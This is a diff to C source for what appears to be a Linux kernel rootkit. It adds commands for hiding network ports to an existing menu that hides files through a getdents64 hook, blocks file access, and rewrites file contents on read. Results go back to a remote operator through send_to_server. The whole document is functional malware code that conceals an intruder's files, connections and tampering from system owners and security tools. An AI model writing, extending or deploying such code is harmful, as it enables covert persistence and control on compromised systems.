@@ -18,22 +18,30 @@ static int list_forbidden_handler(char *args);
 static int list_alterate_handler(char *args);
 static int unmodify_file_handler(char *args);
 static int modify_file_handler(char *args);
+static int hide_port_handler(char *args);
+static int unhide_port_handler(char *args);
+static int list_hidden_port_handler(char *args);
+static int hooks_help(char *args);
 
 // hooks menu commands, must start with 'hooks' to be recognized
 static struct command hooks_commands[] = {
     { "hide", 4, "hide a file or directory (getdents64 hook)", 43, hide_dir_handler },
     { "unhide", 6, "unhide a file or directory", 32, unhide_dir_handler },
-    { "list_hide", 10, "list hidden files/directories", 34, list_hidden_handler },
+    { "list_hide", 9, "list hidden files/directories", 34, list_hidden_handler },
+
+    { "add_port", 8, "add port to hide", 16, hide_port_handler },
+    { "remove_port", 11, "remove hidden port", 18, unhide_port_handler },
+    { "list_port", 9, "list hidden ports", 17, list_hidden_port_handler },
 
     { "forbid", 6, "forbid open/stat on a file (openat/stat/lstat... hook)", 55, forbid_file_handler },
     { "unforbid", 8, "remove forbid on a file", 30, unforbid_file_handler },
-    { "list_forbid", 12, "list forbidden files", 30, list_forbidden_handler },
+    { "list_forbid", 11, "list forbidden files", 30, list_forbidden_handler },
 
-    { "modify", 7, "[CAREFUL] modify a file with hide/replace operation (read hook)", 64, modify_file_handler },
+    { "modify", 6, "[CAREFUL] modify a file with hide/replace operation (read hook)", 64, modify_file_handler },
     { "unmodify", 8, "unmodify a file", 30, unmodify_file_handler },
-    { "list_modify", 12, "list alterate rules", 30, list_alterate_handler },
+    { "list_modify", 11, "list alterate rules", 30, list_alterate_handler },
 
-    { "help", 4, "display hooks help menu", 25, NULL },
+    { "help", 4, "display hooks help menu", 25, hooks_help },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -50,6 +58,39 @@ static int hooks_help(char *args) {
     kfree(buf);
     return 0;
 }
+
+static int hide_port_handler(char *args) {
+    if (!args)
+        return -EINVAL;
+    int r = hide_port(args);
+    if (r == SUCCESS)
+        send_to_server("Hidden: %s\n", args);
+    else
+        send_to_server("Error hiding %s: %d\n", args, r);
+    return r;
+};
+
+static int unhide_port_handler(char *args) {
+    if (!args)
+        return -EINVAL;
+    int r = unhide_port(args);
+    if (r == SUCCESS)
+        send_to_server("Unhidden: %s\n", args);
+    else
+        send_to_server("Error unhiding %s: %d\n", args, r);
+    return r;
+};
+
+static int list_hidden_port_handler(char *args) {
+    char *buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    int len = port_list_get(buf, STD_BUFFER_SIZE);
+    if (len <= 0)
+        send_to_server("No hidden entries");
+    else
+        send_to_server("%s", buf);
+    kfree(buf);
+    return len;
+};
 
 static int hide_dir_handler(char *args) {
     if (!args)
@@ -198,18 +239,15 @@ static int unmodify_file_handler(char *args) {
 // Dispatcher function
 int hooks_menu_handler(char *args) {
     char *cmd = strsep(&args, " \t");
+
     int i;
     if (!cmd)
         return hooks_help(NULL);
 
     for (i = 0; hooks_commands[i].cmd_name != NULL; i++) {
-        if (strncmp(cmd, hooks_commands[i].cmd_name,
-                    hooks_commands[i].cmd_name_size)
-            == 0) {
+        if (strncmp(cmd, hooks_commands[i].cmd_name, hooks_commands[i].cmd_name_size) == 0) {
             if (hooks_commands[i].cmd_handler)
                 return hooks_commands[i].cmd_handler(args);
-            else
-                return hooks_help(NULL);
         }
     }
 
